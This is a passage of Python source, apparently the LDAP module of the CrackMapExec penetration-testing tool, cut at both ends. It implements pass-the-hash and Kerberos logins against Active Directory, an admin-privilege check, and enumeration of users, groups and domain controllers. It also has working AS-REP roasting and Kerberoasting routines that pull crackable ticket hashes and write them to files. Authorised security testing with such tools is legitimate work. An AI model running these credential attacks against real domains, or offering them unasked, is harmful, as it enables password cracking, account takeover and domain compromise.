off\n            self.create_conn_obj()\n        self.output_filename = os.path.expanduser(f""~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}"".replace("":"", ""-""))\n\n    def print_host_info(self):\n        self.logger.debug(""Printing host info for LDAP"")\n        if self.args.no_smb:\n            self.logger.extra[""protocol""] = ""LDAP""\n            self.logger.extra[""port""] = ""389""\n            self.logger.display(f""Connecting to LDAP {self.hostname}"")\n            # self.logger.display(self.endpoint)\n        else:\n            self.logger.extra[""protocol""] = ""SMB"" if not self.no_ntlm else ""LDAP""\n            self.logger.extra[""port""] = ""445"" if not self.no_ntlm else ""389""\n            signing = colored(f""signing:{self.signing}"", host_info_colors[0], attrs=[\'bold\']) if self.signing else colored(f""signing:{self.signing}"", host_info_colors[1], attrs=[\'bold\'])\n            smbv1 = colored(f""SMBv1:{self.smbv1}"", host_info_colors[2], attrs=[\'bold\']) if self.smbv1 else colored(f""SMBv1:{self.smbv1}"", host_info_colors[3], attrs=[\'bold\'])\n            self.logger.display(f""{self.server_os}{f\' x{self.os_arch}\' if self.os_arch else \'\'} (name:{self.hostname}) (domain:{self.domain}) ({signing}) ({smbv1})"")\n            self.logger.extra[""protocol""] = ""LDAP""\n            # self.logger.display(self.endpoint)\n        return True\n\n    def kerberos_login(\n        self,\n        domain,\n        username,\n        password="""",\n        ntlm_hash="""",\n        aesKey="""",\n        kdcHost="""",\n        useCache=False,\n    ):\n        # cme_logger.getLogger(""impacket"").disabled = True\n        self.username = username\n        self.password = password\n        self.domain = domain\n        self.kdcHost = kdcHost\n        self.aesKey = aesKey\n\n        lmhash = """"\n        nthash = """"\n        self.username = username\n        # This checks to see if we didn\'t provide the LM Hash\n        if ntlm_hash.find("":"") != -1:\n            lmhash, nthash = ntlm_hash.split("":"")\n            self.hash = nthash\n        else:\n            nthash = ntlm_hash\n            self.hash = ntlm_hash\n        if lmhash:\n            self.lmhash = lmhash\n        if nthash:\n            self.nthash = nthash\n\n        if self.password == """" and self.args.asreproast:\n            hash_tgt = KerberosAttacks(self).getTGT_asroast(self.username)\n            if hash_tgt:\n                self.logger.highlight(f""{hash_tgt}"")\n                with open(self.args.asreproast, ""a+"") as hash_asreproast:\n                    hash_asreproast.write(hash_tgt + ""\\n"")\n            return False\n\n        if not all("""" == s for s in [self.nthash, password, aesKey]):\n            kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)\n        else:\n            kerb_pass = """"\n\n        try:\n            # Connect to LDAP\n            proto = ""ldaps"" if (self.args.gmsa or self.args.port == 636) else ""ldap""\n            ldap_url = f""{proto}://{self.target}""\n            self.logger.info(f""Connecting to {ldap_url} - {self.baseDN} [1]"")\n            self.ldapConnection = ldap_impacket.LDAPConnection(ldap_url, self.baseDN)\n            self.ldapConnection.kerberosLogin(\n                username,\n                password,\n                domain,\n                self.lmhash,\n                self.nthash,\n                aesKey,\n                kdcHost=kdcHost,\n                useCache=useCache,\n            )\n\n            if self.username == """":\n                self.username = self.get_ldap_username()\n\n            self.check_if_admin()\n\n            used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""\n            out = f""{domain}\\\\{self.username}{used_ccache} {self.mark_pwned()}""\n\n            # out = f""{domain}\\\\{self.username}{\' from ccache\' if useCache else \':%s\' % (kerb_pass if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8)} {highlight(\'({})\'.format(self.config.get(\'CME\', \'pwn3d_label\')) if self.admin_privs else \'\')}""\n\n            self.logger.extra[""protocol""] = ""LDAP""\n            self.logger.extra[""port""] = ""636"" if (self.args.gmsa or self.args.port == 636) else ""389""\n            self.logger.success(out)\n\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except SessionKeyDecryptionError:\n            # for PRE-AUTH account\n            self.logger.success(\n                f""{domain}\\\\{self.username}{\' account vulnerable to asreproast attack\'} {\'\'}"",\n                color=""yellow"",\n            )\n            return False\n        except SessionError as e:\n            error, desc = e.getErrorString()\n            used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""\n            self.logger.fail(\n                f""{self.domain}\\\\{self.username}{used_ccache} {str(error)}"",\n                color=""magenta"" if error in ldap_error_status else ""red"",\n            )\n            return False\n        except (KeyError, KerberosException, OSError) as e:\n            self.logger.fail(\n                f""{self.domain}\\\\{self.username}{\' from ccache\' if useCache else \':%s\' % (kerb_pass if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8)} {str(e)}"",\n                color=""red"",\n            )\n            return False\n        except ldap_impacket.LDAPSessionError as e:\n            if str(e).find(""strongerAuthRequired"") >= 0:\n                # We need to try SSL\n                try:\n                    # Connect to LDAPS\n                    ldaps_url = f""ldaps://{self.target}""\n                    self.logger.info(f""Connecting to {ldaps_url} - {self.baseDN} [2]"")\n                    self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)\n                    self.ldapConnection.kerberosLogin(\n                        username,\n                        password,\n                        domain,\n                        self.lmhash,\n                        self.nthash,\n                        aesKey,\n                        kdcHost=kdcHost,\n                        useCache=useCache,\n                    )\n\n                    if self.username == """":\n                        self.username = self.get_ldap_username()\n\n                    self.check_if_admin()\n\n                    # Prepare success credential text\n                    out = f""{domain}\\\\{self.username} {self.mark_pwned()}""\n\n                    self.logger.extra[""protocol""] = ""LDAPS""\n                    self.logger.extra[""port""] = ""636""\n                    self.logger.success(out)\n\n                    if not self.args.local_auth:\n                        add_user_bh(self.username, self.domain, self.logger, self.config)\n                    return True\n                except SessionError as e:\n                    error, desc = e.getErrorString()\n                    self.logger.fail(\n                        f""{self.domain}\\\\{self.username}{\' from ccache\' if useCache else \':%s\' % (kerb_pass if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8)} {str(error)}"",\n                        color=""magenta"" if error in ldap_error_status else ""red"",\n                    )\n                    return False\n                except:\n                    error_code = str(e).split()[-2][:-1]\n                    self.logger.fail(\n                        f""{self.domain}\\\\{self.username}:{self.password if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else \'\'}"",\n                        color=""magenta"" if error_code in ldap_error_status else ""red"",\n                    )\n                    return False\n            else:\n                error_code = str(e).split()[-2][:-1]\n                self.logger.fail(\n                    f""{self.domain}\\\\{self.username}{\' from ccache\' if useCache else \':%s\' % (kerb_pass if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8)} {ldap_error_status[error_code] if error_code in ldap_error_status else \'\'}"",\n                    color=""magenta"" if error_code in ldap_error_status else ""red"",\n                )\n                return False\n\n    def plaintext_login(self, domain, username, password):\n        self.username = username\n        self.password = password\n        self.domain = domain\n\n        if self.password == """" and self.args.asreproast:\n            hash_tgt = KerberosAttacks(self).getTGT_asroast(self.username)\n            if hash_tgt:\n                self.logger.highlight(f""{hash_tgt}"")\n                with open(self.args.asreproast, ""a+"") as hash_asreproast:\n                    hash_asreproast.write(hash_tgt + ""\\n"")\n            return False\n\n        try:\n            # Connect to LDAP\n            proto = ""ldaps"" if (self.args.gmsa or self.args.port == 636) else ""ldap""\n            ldap_url = f""{proto}://{self.target}""\n            self.logger.debug(f""Connecting to {ldap_url} - {self.baseDN} [3]"")\n            self.ldapConnection = ldap_impacket.LDAPConnection(ldap_url, self.baseDN)\n            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)\n            self.check_if_admin()\n\n            # Prepare success credential text\n            out = f""{domain}\\\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}""\n\n            self.logger.extra[""protocol""] = ""LDAP""\n            self.logger.extra[""port""] = ""636"" if (self.args.gmsa or self.args.port == 636) else ""389""\n            self.logger.success(out)\n\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except ldap_impacket.LDAPSessionError as e:\n            if str(e).find(""strongerAuthRequired"") >= 0:\n                # We need to try SSL\n                try:\n                    # Connect to LDAPS\n                    ldaps_url = f""ldaps://{self.target}""\n                    self.logger.info(f""Connecting to {ldaps_url} - {self.baseDN} [4]"")\n                    self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)\n                    self.ldapConnection.login(\n                        self.username,\n                        self.password,\n                        self.domain,\n                        self.lmhash,\n                        self.nthash,\n                    )\n                    self.check_if_admin()\n\n                    # Prepare success credential text\n                    out = f""{domain}\\\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}""\n                    self.logger.extra[""protocol""] = ""LDAPS""\n                    self.logger.extra[""port""] = ""636""\n                    self.logger.success(out)\n\n                    if not self.args.local_auth:\n                        add_user_bh(self.username, self.domain, self.logger, self.config)\n                    return True\n                except:\n                    error_code = str(e).split()[-2][:-1]\n                    self.logger.fail(\n                        f""{self.domain}\\\\{self.username}:{self.password if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else \'\'}"",\n                        color=""magenta"" if (error_code in ldap_error_status and error_code != 1) else ""red"",\n                    )\n            else:\n                error_code = str(e).split()[-2][:-1]\n                self.logger.fail(\n                    f""{self.domain}\\\\{self.username}:{self.password if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else \'\'}"",\n                    color=""magenta"" if (error_code in ldap_error_status and error_code != 1) else ""red"",\n                )\n            return False\n        except OSError as e:\n            self.logger.fail(f""{self.domain}\\\\{self.username}:{self.password if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {\'Error connecting to the domain, are you sure LDAP service is running on the target?\'} \\nError: {e}"")\n            return False\n\n    def hash_login(self, domain, username, ntlm_hash):\n        self.logger.extra[""protocol""] = ""LDAP""\n        self.logger.extra[""port""] = ""389""\n        lmhash = """"\n        nthash = """"\n\n        # This checks to see if we didn\'t provide the LM Hash\n        if ntlm_hash.find("":"") != -1:\n            lmhash, nthash = ntlm_hash.split("":"")\n        else:\n            nthash = ntlm_hash\n\n        self.hash = ntlm_hash\n        if lmhash:\n            self.lmhash = lmhash\n        if nthash:\n            self.nthash = nthash\n\n        self.username = username\n        self.domain = domain\n\n        if self.hash == """" and self.args.asreproast:\n            hash_tgt = KerberosAttacks(self).getTGT_asroast(self.username)\n            if hash_tgt:\n                self.logger.highlight(f""{hash_tgt}"")\n                with open(self.args.asreproast, ""a+"") as hash_asreproast:\n                    hash_asreproast.write(hash_tgt + ""\\n"")\n            return False\n\n        try:\n            # Connect to LDAP\n            proto = ""ldaps"" if (self.args.gmsa or self.args.port == 636) else ""ldap""\n            ldaps_url = f""{proto}://{self.target}""\n            self.logger.info(f""Connecting to {ldaps_url} - {self.baseDN}"")\n            self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)\n            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)\n            self.check_if_admin()\n\n            # Prepare success credential text\n            out = f""{domain}\\\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}""\n            self.logger.extra[""protocol""] = ""LDAP""\n            self.logger.extra[""port""] = ""636"" if (self.args.gmsa or self.args.port == 636) else ""389""\n            self.logger.success(out)\n\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except ldap_impacket.LDAPSessionError as e:\n            if str(e).find(""strongerAuthRequired"") >= 0:\n                try:\n                    # We need to try SSL\n                    ldaps_url = f""{proto}://{self.target}""\n                    self.logger.debug(f""Connecting to {ldaps_url} - {self.baseDN}"")\n                    self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)\n                    self.ldapConnection.login(\n                        self.username,\n                        self.password,\n                        self.domain,\n                        self.lmhash,\n                        self.nthash,\n                    )\n                    self.check_if_admin()\n\n                    # Prepare success credential text\n                    out = f""{domain}\\\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}""\n                    self.logger.extra[""protocol""] = ""LDAPS""\n                    self.logger.extra[""port""] = ""636""\n                    self.logger.success(out)\n\n                    if not self.args.local_auth:\n                        add_user_bh(self.username, self.domain, self.logger, self.config)\n                    return True\n                except ldap_impacket.LDAPSessionError as e:\n                    error_code = str(e).split()[-2][:-1]\n                    self.logger.fail(\n                        f""{self.domain}\\\\{self.username}:{nthash if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else \'\'}"",\n                        color=""magenta"" if (error_code in ldap_error_status and error_code != 1) else ""red"",\n                    )\n            else:\n                error_code = str(e).split()[-2][:-1]\n                self.logger.fail(\n                    f""{self.domain}\\\\{self.username}:{nthash if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else \'\'}"",\n                    color=""magenta"" if (error_code in ldap_error_status and error_code != 1) else ""red"",\n                )\n            return False\n        except OSError as e:\n            self.logger.fail(f""{self.domain}\\\\{self.username}:{self.password if not self.config.get(\'CME\', \'audit_mode\') else self.config.get(\'CME\', \'audit_mode\') * 8} {\'Error connecting to the domain, are you sure LDAP service is running on the target?\'} \\nError: {e}"")\n            return False\n\n    def create_smbv1_conn(self):\n        self.logger.debug(f""Creating smbv1 connection object"")\n        try:\n            self.conn = SMBConnection(self.host, self.host, None, 445, preferredDialect=SMB_DIALECT)\n            self.smbv1 = True\n            if self.conn:\n                self.logger.debug(f""SMBv1 Connection successful"")\n        except socket.error as e:\n            if str(e).find(""Connection reset by peer"") != -1:\n                self.logger.debug(f""SMBv1 might be disabled on {self.host}"")\n            return False\n        except Exception as e:\n            self.logger.debug(f""Error creating SMBv1 connection to {self.host}: {e}"")\n            return False\n        return True\n\n    def create_smbv3_conn(self):\n        self.logger.debug(f""Creating smbv3 connection object"")\n        try:\n            self.conn = SMBConnection(self.host, self.host, None, 445)\n            self.smbv1 = False\n            if self.conn:\n                self.logger.debug(f""SMBv3 Connection successful"")\n        except socket.error:\n            return False\n        except Exception as e:\n            self.logger.debug(f""Error creating SMBv3 connection to {self.host}: {e}"")\n            return False\n\n        return True\n\n    def create_conn_obj(self):\n        if not self.args.no_smb:\n            if self.create_smbv1_conn():\n                return True\n            elif self.create_smbv3_conn():\n                return True\n            return False\n        else:\n            return True\n\n    def get_sid(self):\n        self.logger.highlight(f""Domain SID {self.sid_domain}"")\n\n    def sid_to_str(self, sid):\n        try:\n            # revision\n            revision = int(sid[0])\n            # count of sub authorities\n            sub_authorities = int(sid[1])\n            # big endian\n            identifier_authority = int.from_bytes(sid[2:8], byteorder=""big"")\n            # If true then it is represented in hex\n            if identifier_authority >= 2**32:\n                identifier_authority = hex(identifier_authority)\n\n            # loop over the count of small endians\n            sub_authority = ""-"" + ""-"".join([str(int.from_bytes(sid[8 + (i * 4) : 12 + (i * 4)], byteorder=""little"")) for i in range(sub_authorities)])\n            object_sid = ""S-"" + str(revision) + ""-"" + str(identifier_authority) + sub_authority\n            return object_sid\n        except Exception:\n            pass\n        return sid\n\n    def check_if_admin(self):\n        # 1. get SID of the domaine\n        search_filter = ""(userAccountControl:1.2.840.113556.1.4.803:=8192)""\n        attributes = [""objectSid""]\n        resp = self.search(search_filter, attributes, sizeLimit=0)\n        answers = []\n        if resp and self.password != """" and self.username != """":\n            for attribute in resp[0][1]:\n                if str(attribute[""type""]) == ""objectSid"":\n                    sid = self.sid_to_str(attribute[""vals""][0])\n                    self.sid_domain = ""-"".join(sid.split(""-"")[:-1])\n\n            # 2. get all group cn name\n            search_filter = ""(|(objectSid="" + self.sid_domain + ""-512)(objectSid="" + self.sid_domain + ""-544)(objectSid="" + self.sid_domain + ""-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))""\n            attributes = [""distinguishedName""]\n            resp = self.search(search_filter, attributes, sizeLimit=0)\n            answers = []\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""distinguishedName"":\n                        answers.append(str(""(memberOf:1.2.840.113556.1.4.1941:="" + attribute[""vals""][0] + "")""))\n\n            # 3. get member of these groups\n            search_filter = ""(&(objectCategory=user)(sAMAccountName="" + self.username + "")(|"" + """".join(answers) + ""))""\n            attributes = [""""]\n            resp = self.search(search_filter, attributes, sizeLimit=0)\n            answers = []\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                if item:\n                    self.admin_privs = True\n\n    def getUnixTime(self, t):\n        t -= 116444736000000000\n        t /= 10000000\n        return t\n\n    def search(self, searchFilter, attributes, sizeLimit=0):\n        try:\n            if self.ldapConnection:\n                self.logger.debug(f""Search Filter={searchFilter}"")\n                \n                # Microsoft Active Directory set an hard limit of 1000 entries returned by any search\n                paged_search_control = ldapasn1_impacket.SimplePagedResultsControl(criticality=True, size=1000)\n                resp = self.ldapConnection.search(\n                    searchFilter=searchFilter,\n                    attributes=attributes,\n                    sizeLimit=sizeLimit,\n                    searchControls=[paged_search_control],\n                )\n                return resp\n        except ldap_impacket.LDAPSearchError as e:\n            if e.getErrorString().find(""sizeLimitExceeded"") >= 0:\n                # We should never reach this code as we use paged search now\n                self.logger.fail(""sizeLimitExceeded exception caught, giving up and processing the data received"")\n                resp = e.getAnswers()\n                pass\n            else:\n                self.logger.fail(e)\n                return False\n        return False\n\n    def users(self):\n        # Building the search filter\n        search_filter = ""(sAMAccountType=805306368)"" if self.username != """" else ""(objectclass=*)""\n        attributes = [\n            ""sAMAccountName"",\n            ""description"",\n            ""badPasswordTime"",\n            ""badPwdCount"",\n            ""pwdLastSet"",\n        ]\n\n        resp = self.search(search_filter, attributes, sizeLimit=0)\n        if resp:\n            answers = []\n            self.logger.display(f""Total of records returned {len(resp):d}"")\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                sAMAccountName = """"\n                badPasswordTime = """"\n                badPwdCount = 0\n                description = """"\n                pwdLastSet = """"\n                try:\n                    if self.username == """":\n                        self.logger.highlight(f""{item[\'objectName\']}"")\n                    else:\n                        for attribute in item[""attributes""]:\n                            if str(attribute[""type""]) == ""sAMAccountName"":\n                                sAMAccountName = str(attribute[""vals""][0])\n                            elif str(attribute[""type""]) == ""description"":\n                                description = str(attribute[""vals""][0])\n                        self.logger.highlight(f""{sAMAccountName:<30} {description}"")\n                except Exception as e:\n                    self.logger.debug(f""Skipping item, cannot process due to error {e}"")\n                    pass\n            return\n\n    def groups(self):\n        # Building the search filter\n        search_filter = ""(objectCategory=group)""\n        attributes = [""name""]\n        resp = self.search(search_filter, attributes, 0)\n        if resp:\n            answers = []\n            self.logger.debug(f""Total of records returned {len(resp):d}"")\n\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                name = """"\n                try:\n                    for attribute in item[""attributes""]:\n                        if str(attribute[""type""]) == ""name"":\n                            name = str(attribute[""vals""][0])\n                    self.logger.highlight(f""{name}"")\n                except Exception as e:\n                    self.logger.debug(""Exception:"", exc_info=True)\n                    self.logger.debug(f""Skipping item, cannot process due to error {e}"")\n                    pass\n            return\n    \n    def dc_list(self):\n        \n        # Building the search filter\n        search_filter = ""(&(objectCategory=computer)(primaryGroupId=516))""\n        attributes = [""dNSHostName""]\n        resp = self.search(search_filter, attributes, 0)\n        for item in resp:              \n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            name = """"\n            try:           \t    \n            \tfor attribute in item[""attributes""]:     \n            \t    if str(attribute[""type""]) == ""dNSHostName"":\n            \t        name = str(attribute[""vals""][0])\n            \ttry:\n            \t    ip_address = socket.gethostbyname(name.split(""."")[0])\n            \t    if ip_address != True and name != """":\n            \t        self.logger.highlight(f""{name} ="", ip_address) \t    \n            \texcept socket.gaierror:\n            \t    self.logger.fail(f""{name} = Connection timeout"")\n            except Exception as e:\n                self.logger.fail(""Exception:"", exc_info=True)\n                self.logger.fail(f""Skipping item, cannot process due to error {e}"")\n\n    def asreproast(self):\n        if self.password == """" and self.nthash == """" and self.kerberos is False:\n            return False\n        # Building the search filter\n        search_filter = ""(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)"" ""(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))"" % (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)\n        attributes = [\n            ""sAMAccountName"",\n            ""pwdLastSet"",\n            ""MemberOf"",\n            ""userAccountControl"",\n            ""lastLogon"",\n        ]\n        resp = self.search(search_filter, attributes, 0)\n        if resp == []:\n            self.logger.highlight(""No entries found!"")\n        elif resp:\n            answers = []\n            self.logger.display(f""Total of records returned {len(resp):d}"")\n\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                mustCommit = False\n                sAMAccountName = """"\n                memberOf = """"\n                pwdLastSet = """"\n                userAccountControl = 0\n                lastLogon = ""N/A""\n                try:\n                    for attribute in item[""attributes""]:\n                        if str(attribute[""type""]) == ""sAMAccountName"":\n                            sAMAccountName = str(attribute[""vals""][0])\n                            mustCommit = True\n                        elif str(attribute[""type""]) == ""userAccountControl"":\n                            userAccountControl = ""0x%x"" % int(attribute[""vals""][0])\n                        elif str(attribute[""type""]) == ""memberOf"":\n                            memberOf = str(attribute[""vals""][0])\n                        elif str(attribute[""type""]) == ""pwdLastSet"":\n                            if str(attribute[""vals""][0]) == ""0"":\n                                pwdLastSet = ""<never>""\n                            else:\n                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                        elif str(attribute[""type""]) == ""lastLogon"":\n                            if str(attribute[""vals""][0]) == ""0"":\n                                lastLogon = ""<never>""\n                            else:\n                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                    if mustCommit is True:\n                        answers.append(\n                            [\n                                sAMAccountName,\n                                memberOf,\n                                pwdLastSet,\n                                lastLogon,\n                                userAccountControl,\n                            ]\n                        )\n                except Exception as e:\n                    self.logger.debug(""Exception:"", exc_info=True)\n                    self.logger.debug(f""Skipping item, cannot process due to error {e}"")\n                    pass\n            if len(answers) > 0:\n                for user in answers:\n                    hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])\n                    self.logger.highlight(f""{hash_TGT}"")\n                    with open(self.args.asreproast, ""a+"") as hash_asreproast:\n                        hash_asreproast.write(hash_TGT + ""\\n"")\n                return True\n            else:\n                self.logger.highlight(""No entries found!"")\n                return\n        else:\n            self.logger.fail(""Error with the LDAP account used"")\n\n    def kerberoasting(self):\n        # Building the search filter\n        searchFilter = ""(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)"" ""(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))""\n        attributes = [\n            ""servicePrincipalName"",\n            ""sAMAccountName"",\n            ""pwdLastSet"",\n            ""MemberOf"",\n            ""userAccountControl"",\n            ""lastLogon"",\n        ]\n        resp = self.search(searchFilter, attributes, 0)\n        if not resp:\n            self.logger.highlight(""No entries found!"")\n        elif resp:\n            answers = []\n\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                mustCommit = False\n                sAMAccountName = """"\n                memberOf = """"\n                SPNs = []\n                pwdLastSet = """"\n                userAccountControl = 0\n                lastLogon = ""N/A""\n                delegation = """"\n                try:\n                    for attribute in item[""attributes""]:\n                        if str(attribute[""type""]) == ""sAMAccountName"":\n                            sAMAccountName = str(attribute[""vals""][0])\n                            mustCommit = True\n                        elif str(attribute[""type""]) == ""userAccountControl"":\n                            userAccountControl = str(attribute[""vals""][0])\n                            if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:\n                                delegation = ""unconstrained""\n                            elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:\n                                delegation = ""constrained""\n                        elif str(attribute[""type""]) == ""memberOf"":\n                            memberOf = str(attribute[""vals""][0])\n                        elif str(attribute[""type""]) == ""pwdLastSet"":\n                            if str(attribute[""vals""][0]) == ""0"":\n                                pwdLastSet = ""<never>""\n                            else:\n                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                        elif str(attribute[""type""]) == ""lastLogon"":\n                            if str(attribute[""vals""][0]) == ""0"":\n                                lastLogon = ""<never>""\n                            else:\n                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                        elif str(attribute[""type""]) == ""servicePrincipalName"":\n                            for spn in attribute[""vals""]:\n                                SPNs.append(str(spn))\n\n                    if mustCommit is True:\n                        if int(userAccountControl) & UF_ACCOUNTDISABLE:\n                            self.logger.debug(f""Bypassing disabled account {sAMAccountName} "")\n                        else:\n                            for spn in SPNs:\n                                answers.append(\n                                    [\n                                        spn,\n                                        sAMAccountName,\n                                        memberOf,\n                                        pwdLastSet,\n                                        lastLogon,\n                                        delegation,\n                                    ]\n                                )\n                except Exception as e:\n                    cme_logger.error(f""Skipping item, cannot process due to error {str(e)}"")\n                    pass\n\n            if len(answers) > 0:\n                self.logger.display(f""Total of records returned {len(answers):d}"")\n                TGT = KerberosAttacks(self).getTGT_kerberoasting()\n                dejavue = []\n                for (\n                    SPN,\n                    sAMAccountName,\n                    memberOf,\n                    pwdLastSet,\n                    lastLogon,\n                    delegation,\n                ) in answers:\n                    if sAMAccountName not in dejavue:\n                        downLevelLogonName = self.targetDomain + ""\\\\"" + sAMAccountName\n\n                        try:\n                            principalName = Principal()\n                            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value\n                            principalName.components = [downLevelLogonName]\n\n                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(\n                                principalName,\n                                self.domain,\n                                self.kdcHost,\n                                TGT[""KDC_REP""],\n                                TGT[""cipher""],\n                                TGT[""sessionKey""],\n                            )\n                            r = KerberosAttacks(self).outputTGS(\n                                tgs,\n                                oldSessionKey,\n                                sessionKey,\n                                sAMAccountName,\n                                self.targetDomain + ""/"" + sAMAccountName,\n                            )\n                            self.logger.highlight(f""sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}"")\n                            self.logger.highlight(f""{r}"")\n                            with open(self.args.kerberoasting, ""a+"") as hash_kerberoasting:\n                                hash_kerberoasting.write(r + ""\\n"")\n                            dejavue.append(sAMAccountName)\n                        except Exception as e:\n                            self.logger.debug(""Exception:"", exc_info=True)\n                            cme_logger.error(f""Principal: {downLevelLogonName} - {e}"")\n                return True\n            else:\n                self.logger.highlight(""No entries found!"")\n                return\n        self.logger.fail(""Error with the LDAP account used"")\n\n    def trusted_for_delegation(self):\n        # Building the search filter\n        searchFilter = ""(userAccountControl:1.2.840.113556.1.4.803:=524288)""\n        attributes = [\n            ""sAMAccountName"",\n            ""pwdLastSet"",\n            ""MemberOf"",\n            ""userAccountControl"",\n            ""lastLogon"",\n        ]\n        resp = self.search(searchFilter, attributes, 0)\n\n        answers = []\n        self.logger.debug(f""Total of records returned {len(resp):d}"")\n\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            mustCommit = False\n            sAMAccountName = """"\n            memberOf = """"\n            pwdLastSet = """"\n            userAccountControl = 0\n            lastLogon = ""N/A""\n            try:\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""sAMAccountName"":\n                        sAMAccountName = str(attribute[""vals""][0])\n                        mustCommit = True\n                    elif str(attribute[""type""]) == ""userAccountControl"":\n                        userAccountControl = ""0x%x"" % int(attribute[""vals""][0])\n                    elif str(attribute[""type""]) == ""memberOf"":\n                        memberOf = str(attribute[""vals""][0])\n                    elif str(attribute[""type""]) == ""pwdLastSet"":\n                        if str(attribute[""vals""][0]) == ""0"":\n                            pwdLastSet = ""<never>""\n                        else:\n                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                    elif str(attribute[""type""]) == ""lastLogon"":\n                        if str(attribute[""vals""][0]) == ""0"":\n                            lastLogon = ""<never>""\n                        else:\n                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                if mustCommit is True:\n                    answers.append(\n                        [\n                            sAMAccountName,\n                            memberOf,\n                            pwdLastSet,\n                            lastLogon,\n                            userAccountControl,\n                        ]\n                    )\n            except Exception as e:\n                self.logger.debug(""Exception:"", exc_info=True)\n                self.logger.debug(f""Skipping item, cannot process due to error {e}"")\n                pass\n        if len(answers) > 0:\n            self.logger.debug(answers)\n            for value in answers:\n                self.logger.highlight(value[0])\n        else:\n            self.logger.fail(""No entries found!"")\n        return\n\n    def password_not_required(self):\n        # Building the search filter\n        searchFilter = ""(userAccountControl:1.2.840.113556.1.4.803:=32)""\n        try:\n            self.logger.debug(f""Search Filter={searchFilter}"")\n            resp = self.ldapConnection.search(\n                searchFilter=searchFilter,\n                attributes=[\n                    ""sAMAccountName"",\n                    ""pwdLastSet"",\n                    ""MemberOf"",\n                    ""userAccountControl"",\n                    ""lastLogon"",\n                ],\n                sizeLimit=0,\n            )\n        except ldap_impacket.LDAPSearchError as e:\n            if e.getErrorString().find(""sizeLimitExceeded"") >= 0:\n                self.logger.debug(""sizeLimitExceeded exception caught, giving up and processing the data received"")\n                # We reached the sizeLimit, process the answers we have already and that\'s it. Until we implement\n                # paged queries\n                resp = 